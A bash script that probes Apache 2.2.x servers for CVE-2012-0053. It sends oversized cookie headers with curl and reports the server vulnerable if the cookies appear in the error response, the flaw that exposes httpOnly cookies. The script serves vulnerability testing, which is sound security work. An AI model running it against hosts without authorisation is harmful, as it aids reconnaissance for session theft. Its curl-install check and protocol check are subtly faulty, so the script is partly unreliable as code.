#!/bin/bash

# Affected: Apache HTTP Server 2.2.x through 2.2.21
# CVE-ID: CVE-2012-0053
# Author: styx00

# Colours <3
RED='\033[0;31m'
GREEN='\033[0;32m'
BOLD=$(tput bold)
RESET=$(tput sgr0)

# Check if 'curl' is installed first
dpkg -l "curl" > /dev/null 2>&1
INSTALLED=$?

printf "Checking if the 'curl' package is installed...\n"
if [ $INSTALLED == '0' ]; then
    printf "${GREEN}${BOLD}[+] The 'curl' package is installed. Let's proceed!${RESET}\n\n"
else
    printf "${RED}${BOLD}[-] The 'curl' package is not installed.${RESET}\n\n"
fi

# Function to show the script's usage
function usage
{
    printf "Usage: ./apacheCookieLeakage.sh -t example.com -p 80 [-s] [-h]\n\n"
    printf "Required:\n\t-t, --target\tTarget FQDN or IP address"
    printf "\n\nOptional Arguments:\n\t-p, --port\tPort number (default HTTP:80 and HTTPS:443)"
    printf "\n\t-s, --show\tShow curl output for manual investigation\n"
    printf "\t-v, --verbose\tMake the script more talkative\n"
    printf "\t-h, --help\tShow help and exit\n"
}

# Loop through the provided arguments
while [ "$1" != "" ]; do
    case $1 in
        -t | --target )         shift
                                target=$1
                                ;;
        -p | --port )           shift
                                port=":"$1
                                ;;
        -H | --Host )           shift
                                host=$1
                                ;;
        -v | --verbose )        verbose="-v"
                                ;;
        -s | --show )           output=true
                                ;;
        -h | --help )           usage
                                exit
                                ;;
        * )                     usage
                                exit 1
    esac
    shift
done

if [ "$target" !=  "" ]
then
  start=`date +%s`

  # To exploit this vulnerability we need to provide long cookie values so generate 1000 characters
  cookieValue=$(for i in {1..1000}; do printf x; done)
  cookie=""

  # Generate a string which contains 10 cookies with the cookie value generated above
  for i in {1..10};
  do
  	cookie="${cookie}TEST${i}=${cookieValue};"
  done

  # Check if the input starts with http:// or https:// and if protocol is not specified assume http://
  if [ ${target} != "http://"* ] && [ ${target} != "https://"* ]
  then
  	printf "No protocol was specified. Assuming http://%s\n" "${target}"
  	target="http://${target}"
  fi

  # Store the response of the curl command so we can check if the cookies sent are reflected in the response
  if [ "$host" != '' ]
  then
    response=$(curl -ski --connect-timeout 10 $verbose ${target}${port} -H "Host: ${host}" -H "Cookie: ${cookie}")
  else
    response=$(curl -ski --connect-timeout 10 $verbose ${target}${port} -H "Cookie: ${cookie}")
  fi

  # If the user provided the -s argument, print the curl output
  if [[ ${output} == true ]]
  then
      printf "\n%s\n" "${response}"
  fi

  # If the cookies sent are reflected in the response, the target is vulnerable
  if [[ ${response} == *"TEST"*"="* ]]
  then
      printf "\nThe server is ${RED}${BOLD}vulnerable${RESET}.\n"
  else
      printf "\nThe server is ${GREEN}${BOLD}NOT vulnerable${RESET}.\n"
  fi

  # Calculate and print script's running time
  end=`date +%s`
  runtime=$((end-start))

  # Print the script's running time
  printf "\nFinished in %s seconds.\n" ${runtime}
else
  usage
fi
